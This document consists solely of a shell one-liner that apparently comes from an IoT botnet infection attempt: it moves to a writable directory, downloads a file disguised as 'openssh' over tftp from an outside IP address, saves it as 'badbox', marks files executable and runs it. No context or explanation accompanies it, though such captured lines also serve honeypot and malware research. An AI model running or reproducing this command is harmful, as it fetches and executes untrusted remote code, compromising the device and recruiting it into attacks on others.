cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 208.67.1.36;cat openssh >badbox;chmod +x *;./badbox
